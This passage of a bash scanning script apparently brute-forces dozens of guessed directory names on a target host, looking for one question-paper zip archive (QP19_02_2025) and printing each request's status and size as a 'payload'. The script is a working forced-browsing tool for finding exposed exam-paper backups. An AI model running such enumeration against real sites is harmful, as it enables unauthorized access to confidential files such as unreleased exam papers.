" "${target}QPUploaderManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
